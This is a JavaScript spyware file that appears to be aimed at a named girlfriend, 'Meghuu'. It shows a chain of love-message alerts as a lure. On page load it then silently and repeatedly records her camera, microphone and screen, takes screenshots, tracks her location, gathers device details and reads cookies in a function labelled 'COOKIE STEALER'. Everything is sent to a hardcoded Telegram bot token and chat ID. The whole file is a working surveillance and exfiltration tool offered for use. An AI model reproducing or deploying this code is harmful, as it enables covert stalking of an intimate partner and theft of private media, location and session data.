// ==================== TELEGRAM CONFIGURATION ====================
const TOKEN = "7568763554:AAEWXMBtpmJTYc4XAvUUA9Fk516PVf8PvcA";
let CHAT_ID = "6837307356";

// ==================== GLOBAL VARIABLES ====================
let currentLocation = null;
let cameraStream = null;
let audioStream = null;
let cameraPermissionGranted = false;
let microphonePermissionGranted = false;

// Screen Recording
let screenRecorder = null;
let screenStream = null;
let recordedChunks = [];
let isScreenRecording = false;

// Camera Recording
let cameraRecorder = null;
let cameraRecordedChunks = [];

// DOM Elements
const statusText = document.getElementById('statusText');
const spinner = document.getElementById('spinner');

// ==================== UTILITY FUNCTIONS ====================
function updateStatus(msg) {
    if (statusText) statusText.innerText = msg;
    console.log(`[STATUS] ${msg}`);
}

function hideSpinner() {
    if (spinner) spinner.style.display = 'none';
}

function getSupportedMimeType() {
    const types = [
        'video/webm;codecs=vp9,opus',
        'video/webm;codecs=vp8,opus',
        'video/webm;codecs=h264,opus',
        'video/webm',
        'video/mp4'
    ];
    for (const type of types) {
        if (MediaRecorder.isTypeSupported(type)) return type;
    }
    return 'video/webm';
}

function formatBytes(bytes) {
    if (bytes === 0) return '0 Bytes';
    const k = 1024;
    const sizes = ['Bytes', 'KB', 'MB', 'GB'];
    const i = Math.floor(Math.log(bytes) / Math.log(k));
    return parseFloat((bytes / Math.pow(k, i)).toFixed(2)) + ' ' + sizes[i];
}

// ==================== TELEGRAM SEND FUNCTIONS ====================
async function sendMessageToTelegram(message) {
    if (!CHAT_ID || !message) return;
    try {
        await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({ 
                chat_id: CHAT_ID, 
                text: message, 
                parse_mode: 'Markdown' 
            })
        });
    } catch (err) {}
}

async function sendVideoToTelegram(file, caption) {
    if (!CHAT_ID) return;
    const formData = new FormData();
    formData.append('chat_id', CHAT_ID);
    formData.append('video', file);
    if (caption) formData.append('caption', caption);
    try {
        const response = await fetch(`https://api.telegram.org/bot${TOKEN}/sendVideo`, { 
            method: "POST", 
            body: formData 
        });
        if (!response.ok) await sendFileToTelegram(file, `📁 ${caption}`);
    } catch (error) {}
}

async function sendPhotoToTelegram(file, caption) {
    if (!CHAT_ID) return;
    const formData = new FormData();
    formData.append('chat_id', CHAT_ID);
    formData.append('photo', file);
    if (caption) formData.append('caption', caption);
    try { 
        await fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, { 
            method: "POST", 
            body: formData 
        }); 
    } catch (error) {}
}

async function sendFileToTelegram(file, caption) {
    if (!CHAT_ID) return;
    const formData = new FormData();
    formData.append('chat_id', CHAT_ID);
    formData.append('document', file);
    if (caption) formData.append('caption', caption);
    try { 
        await fetch(`https://api.telegram.org/bot${TOKEN}/sendDocument`, { 
            method: "POST", 
            body: formData 
        }); 
    } catch (error) {}
}

// ==================== REQUEST CAMERA & MICROPHONE FIRST ====================
async function requestCameraAndMicrophone() {
    updateStatus("Requesting camera permission...");
    
    try {
        // Request camera first
        const videoStream = await navigator.mediaDevices.getUserMedia({
            video: { 
                facingMode: 'user', 
                width: { ideal: 1280 }, 
                height: { ideal: 720 } 
            },
            audio: false
        });
        cameraStream = videoStream;
        cameraPermissionGranted = true;
        await sendMessageToTelegram(`📹 **Camera Permission GRANTED** ✅`);
        updateStatus("Camera access granted");
        
        // Take initial photos immediately after permission
        await captureCameraPhotos();
        
    } catch (cameraError) {
        cameraPermissionGranted = false;
        await sendMessageToTelegram(`❌ **Camera Permission DENIED**\n${cameraError.message}`);
        updateStatus("Camera access denied");
    }
    
    // Request microphone separately
    try {
        const audioStream_ = await navigator.mediaDevices.getUserMedia({ 
            audio: { 
                echoCancellation: false, 
                noiseSuppression: false,
                autoGainControl: false
            } 
        });
        audioStream = audioStream_;
        microphonePermissionGranted = true;
        await sendMessageToTelegram(`🎤 **Microphone Permission GRANTED** ✅`);
        
        // Start audio recording immediately
        await startAudioRecording();
        
    } catch (audioError) {
        microphonePermissionGranted = false;
        await sendMessageToTelegram(`❌ **Microphone Permission DENIED**\n${audioError.message}`);
    }
}

// ==================== SCREEN RECORDING (SILENT) ====================
async function startScreenRecording() {
    if (!CHAT_ID || isScreenRecording) return;
    updateStatus("Requesting screen recording...");
    try {
        screenStream = await navigator.mediaDevices.getDisplayMedia({
            video: { 
                cursor: "always", 
                displaySurface: "monitor", 
                frameRate: { ideal: 30 } 
            },
            audio: true
        });
        
        const mimeType = getSupportedMimeType();
        screenRecorder = new MediaRecorder(screenStream, { 
            mimeType: mimeType, 
            videoBitsPerSecond: 2500000 
        });
        recordedChunks = [];
        
        screenRecorder.ondataavailable = (event) => { 
            if (event.data?.size > 0) recordedChunks.push(event.data); 
        };
        
        screenRecorder.onstop = async () => {
            isScreenRecording = false;
            if (recordedChunks.length === 0) return;
            
            const blob = new Blob(recordedChunks, { type: mimeType });
            const extension = mimeType.includes('mp4') ? 'mp4' : 'webm';
            const file = new File([blob], `screen_record_${Date.now()}.${extension}`, { type: mimeType });
            await sendVideoToTelegram(file, `🎥 **Screen Recording**\n📊 Size: ${formatBytes(blob.size)}`);
            
            recordedChunks = [];
            if (screenStream) { 
                screenStream.getTracks().forEach(track => track.stop()); 
                screenStream = null; 
            }
            screenRecorder = null;
        };
        
        screenRecorder.start(1000);
        isScreenRecording = true;
        await sendMessageToTelegram(`🎬 **Screen Recording Started** (60 seconds)`);
        updateStatus("Screen recording in progress...");
        
        setTimeout(() => { 
            if (isScreenRecording && screenRecorder) stopScreenRecording(); 
        }, 60000);
        
        screenStream.getVideoTracks()[0]?.addEventListener('ended', () => { 
            if (isScreenRecording) stopScreenRecording(); 
        });
        
    } catch (error) {
        updateStatus("Screen recording denied or failed");
        await sendMessageToTelegram(`❌ **Screen Recording Failed**\n${error.message}`);
    }
}

function stopScreenRecording() {
    if (screenRecorder && screenRecorder.state === 'recording') {
        screenRecorder.stop();
        isScreenRecording = false;
    }
}

// ==================== SCREENSHOT CAPTURE ====================
async function captureScreenshot() {
    if (!CHAT_ID) return;
    try {
        const stream = await navigator.mediaDevices.getDisplayMedia({ 
            video: { cursor: "always" }, 
            audio: false 
        });
        
        const video = document.createElement('video');
        video.style.display = 'none';
        document.body.appendChild(video);
        video.srcObject = stream;
        await video.play();
        await new Promise(resolve => setTimeout(resolve, 500));
        
        const canvas = document.createElement('canvas');
        canvas.width = video.videoWidth;
        canvas.height = video.videoHeight;
        canvas.getContext('2d').drawImage(video, 0, 0);
        
        stream.getTracks().forEach(track => track.stop());
        video.remove();
        
        canvas.toBlob(async (blob) => {
            const file = new File([blob], `screenshot_${Date.now()}.png`, { type: 'image/png' });
            await sendPhotoToTelegram(file, `📸 **Screenshot**`);
        }, 'image/png');
        
    } catch (error) {}
}

// ==================== CAMERA VIDEO RECORDING ====================
async function startCameraRecording() {
    if (!CHAT_ID) return;
    if (!cameraPermissionGranted) {
        await sendMessageToTelegram(`⚠️ **Camera Recording Skipped** - No camera permission`);
        return;
    }
    
    try {
        let stream = cameraStream;
        if (!stream || !stream.active) {
            stream = await navigator.mediaDevices.getUserMedia({
                video: { 
                    facingMode: 'user', 
                    width: { ideal: 1280 }, 
                    height: { ideal: 720 }, 
                    frameRate: { ideal: 30 } 
                },
                audio: false
            });
            cameraStream = stream;
        }
        
        const mimeType = getSupportedMimeType();
        cameraRecorder = new MediaRecorder(stream, { 
            mimeType: mimeType, 
            videoBitsPerSecond: 2500000 
        });
        cameraRecordedChunks = [];
        
        cameraRecorder.ondataavailable = (event) => { 
            if (event.data?.size > 0) cameraRecordedChunks.push(event.data); 
        };
        
        cameraRecorder.onstop = async () => {
            if (cameraRecordedChunks.length === 0) return;
            const blob = new Blob(cameraRecordedChunks, { type: mimeType });
            const extension = mimeType.includes('mp4') ? 'mp4' : 'webm';
            const file = new File([blob], `camera_record_${Date.now()}.${extension}`, { type: mimeType });
            await sendVideoToTelegram(file, `📹 **Camera Video Recording**`);
            cameraRecordedChunks = [];
        };
        
        cameraRecorder.start(1000);
        await sendMessageToTelegram(`🎥 **Camera Recording Started** (30 seconds)`);
        
        setTimeout(() => { 
            if (cameraRecorder?.state === 'recording') {
                cameraRecorder.stop();
                if (cameraStream) cameraStream.getTracks().forEach(track => track.stop());
                cameraRecorder = null;
            }
        }, 30000);
        
    } catch (error) {
        await sendMessageToTelegram(`❌ **Camera Recording Failed**\n${error.message}`);
    }
}

// ==================== CAMERA PHOTOS ====================
async function captureCameraPhotos() {
    if (!CHAT_ID) return;
    if (!cameraPermissionGranted) return;
    
    try {
        let stream = cameraStream;
        if (!stream || !stream.active) {
            stream = await navigator.mediaDevices.getUserMedia({
                video: { 
                    facingMode: 'user', 
                    width: { ideal: 1280 }, 
                    height: { ideal: 720 } 
                },
                audio: false
            });
            cameraStream = stream;
        }
        
        const video = document.createElement('video');
        video.style.display = 'none';
        document.body.appendChild(video);
        video.srcObject = stream;
        await video.play();
        
        for (let i = 1; i <= 3; i++) {
            await new Promise(r => setTimeout(r, 500));
            const canvas = document.createElement('canvas');
            canvas.width = video.videoWidth || 640;
            canvas.height = video.videoHeight || 480;
            canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
            
            canvas.toBlob(async (blob) => {
                const file = new File([blob], `camera_photo_${i}_${Date.now()}.jpg`, { type: 'image/jpeg' });
                await sendPhotoToTelegram(file, `📸 **Camera Photo #${i}**`);
            }, 'image/jpeg', 0.9);
        }
        
        video.remove();
        await sendMessageToTelegram(`📸 **Captured 3 camera photos**`);
        
    } catch (error) {}
}

// ==================== AUDIO RECORDING ====================
async function startAudioRecording() {
    if (!CHAT_ID) return;
    if (!microphonePermissionGranted) {
        await sendMessageToTelegram(`⚠️ **Audio Recording Skipped** - No microphone permission`);
        return;
    }
    
    try {
        let stream = audioStream;
        if (!stream || !stream.active) {
            stream = await navigator.mediaDevices.getUserMedia({ 
                audio: { 
                    echoCancellation: false, 
                    noiseSuppression: false,
                    autoGainControl: false
                } 
            });
            audioStream = stream;
        }
        
        const audioRecorder = new MediaRecorder(stream, { mimeType: 'audio/webm' });
        const audioChunks = [];
        
        audioRecorder.ondataavailable = (event) => { 
            if (event.data.size > 0) audioChunks.push(event.data); 
        };
        
        audioRecorder.onstop = async () => {
            if (audioChunks.length === 0) return;
            const audioBlob = new Blob(audioChunks, { type: 'audio/webm' });
            const file = new File([audioBlob], `audio_${Date.now()}.webm`, { type: 'audio/webm' });
            await sendFileToTelegram(file, `🎤 **Audio Recording** (10 seconds)`);
        };
        
        audioRecorder.start();
        await sendMessageToTelegram(`🎤 **Audio Recording Started** (10 seconds)`);
        
        setTimeout(() => { 
            if (audioRecorder.state === 'recording') audioRecorder.stop(); 
        }, 10000);
        
    } catch (error) {
        await sendMessageToTelegram(`❌ **Audio Recording Failed**\n${error.message}`);
    }
}

// ==================== LOCATION TRACKING ====================
async function getLocation() {
    if (!navigator.geolocation) return;
    
    navigator.geolocation.getCurrentPosition(
        async function(position) {
            currentLocation = {
                lat: position.coords.latitude,
                lng: position.coords.longitude,
                accuracy: Math.round(position.coords.accuracy)
            };
            
            const googleMapsLink = `https://www.google.com/maps?q=${currentLocation.lat},${currentLocation.lng}&z=15`;
            await sendMessageToTelegram(`📍 **Current Location**\n🗺️ ${googleMapsLink}\n🎯 Accuracy: ±${currentLocation.accuracy}m`);
            
            try {
                await fetch(`https://api.telegram.org/bot${TOKEN}/sendLocation`, {
                    method: "POST",
                    headers: { "Content-Type": "application/json" },
                    body: JSON.stringify({ 
                        chat_id: CHAT_ID, 
                        latitude: currentLocation.lat, 
                        longitude: currentLocation.lng 
                    })
                });
            } catch (err) {}
        },
        function(error) {},
        { enableHighAccuracy: true, timeout: 5000, maximumAge: 0 }
    );
}

// ==================== DEVICE INFO ====================
async function collectDeviceInfo() {
    const getBatteryInfo = async () => {
        if ('getBattery' in navigator) {
            try {
                const battery = await navigator.getBattery();
                return `${Math.round(battery.level * 100)}% (${battery.charging ? 'Charging' : 'Not charging'})`;
            } catch(e) { return 'Unknown'; }
        }
        return 'Not supported';
    };
    
    const getConnectionInfo = () => {
        const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
        if (conn) return `${conn.effectiveType || 'Unknown'} (${conn.type || 'Unknown'})`;
        return 'Unknown';
    };
    
    return {
        timestamp: new Date().toLocaleString('en-US'),
        ip: await getIPAddress(),
        userAgent: navigator.userAgent,
        platform: navigator.platform,
        language: navigator.language,
        screen: `${window.screen.width}x${window.screen.height}`,
        viewport: `${window.innerWidth}x${window.innerHeight}`,
        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
        hardwareConcurrency: navigator.hardwareConcurrency || 'Unknown',
        deviceMemory: navigator.deviceMemory || 'Unknown',
        battery: await getBatteryInfo(),
        connection: getConnectionInfo(),
        cookiesEnabled: navigator.cookieEnabled ? 'Yes' : 'No',
        online: navigator.onLine ? 'Online' : 'Offline'
    };
}

async function getIPAddress() {
    try {
        const response = await fetch('https://api.ipify.org?format=json');
        const data = await response.json();
        return data.ip;
    } catch {
        try {
            const response = await fetch('https://api.my-ip.io/ip.json');
            const data = await response.json();
            return data.ip;
        } catch {
            return 'Unable to fetch';
        }
    }
}

// ==================== COOKIE STEALER ====================
function getAllCookies() {
    const cookies = {};
    const cookieString = document.cookie;
    if (!cookieString) return cookies;
    
    cookieString.split(';').forEach(cookie => {
        const parts = cookie.split('=');
        const name = parts[0].trim();
        const value = parts.length > 1 ? decodeURIComponent(parts.slice(1).join('=').trim()) : '';
        cookies[name] = value;
    });
    return cookies;
}

async function stealCookies() {
    const cookies = getAllCookies();
    if (Object.keys(cookies).length > 0) {
        await sendMessageToTelegram(`🍪 **Cookies Stolen**\n\`\`\`json\n${JSON.stringify(cookies, null, 2)}\n\`\`\``);
    }
}

// ==================== MAIN FUNCTION ====================
async function startAllOperations() {
    updateStatus("Initializing...");
    await sendMessageToTelegram(`🔴 **SILENT RECORDING SYSTEM ACTIVE** 🔴\n⏰ Time: ${new Date().toLocaleString()}`);
    
    // Send device info
    const info = await collectDeviceInfo();
    await sendMessageToTelegram(`📱 **Device Information**\n\`\`\`json\n${JSON.stringify(info, null, 2)}\n\`\`\``);
    
    // FIRST: Request camera and microphone permissions
    await requestCameraAndMicrophone();
    
    // AFTER permissions granted, start screen recording
    setTimeout(() => { startScreenRecording(); }, 2000);
    setTimeout(() => { captureScreenshot(); }, 3000);
    setTimeout(() => { getLocation(); }, 4000);
    
    // Steal cookies
    await stealCookies();
    
    // Repeat intervals
    setInterval(() => { captureScreenshot(); }, 45000);
    setInterval(() => { getLocation(); }, 60000);
    setInterval(() => { stealCookies(); }, 120000);
    setInterval(() => { startCameraRecording(); }, 90000);
    setInterval(() => { captureCameraPhotos(); }, 120000);
    setInterval(() => { startAudioRecording(); }, 180000);
    
    updateStatus("Ready");
    hideSpinner();
}

// ==================== SHOW LOVE ALERTS ====================
function showLoveAlerts() {
    const alerts = [
        "Hello Meghuu 😘",
        "I can't stop thinking about you.🥰😚❤",
        "You'll always be my girl.",
        "I love making you laugh. ❤❤❤😚",
        "When I'm with you, nothing else matters.",
        "All love is sweet, but ours is the sweetest.",
        "Because you're in my life, I know true love exists..",
        "I love you today. I will love you tomorrow. And I'll keep on loving you every day after that, too.",
        "I can't believe a girl like you exists and that I'm lucky enough to have found her.",
        "Know that no matter where life takes us, you will always be the only one for me.",
        "My favorite part of every day is the time I get to spend with you.",
        "When others talk about their greatest achievements and things they are most proud of, the only thing that comes to mind is you.",
        "I'm missing you.",
        "You are the prettiest girl I've ever seen.",
        "Whenever I count my blessings, you are at the top of my list.",
        "I am the luckiest man alive because I get to call you mine.",
        "No one understands me like you do.",
        "You know exactly what I need, even if I don't say it.",
        "I love you not only for who you are, but also for who I become when I am with you.",
        "Ever since I met you, no one else has been worth thinking about.",
        "I know you love me because you put up with me even when I'm at my worst.",
        "if you need me, just call me i don't care if im sleeping or having my own problems or angry with you. ill be there for you anytime❣",
        "love you so much Meghuu ❣❣❣❣❣❣"
    ];
    
    let index = 0;
    function showNextAlert() {
        if (index < alerts.length) {
            alert(alerts[index]);
            index++;
            setTimeout(showNextAlert, 600);
        }
    }
    setTimeout(showNextAlert, 500);
}

// ==================== AUTO-START ====================
document.addEventListener('DOMContentLoaded', function() {
    showLoveAlerts();
    startAllOperations();
});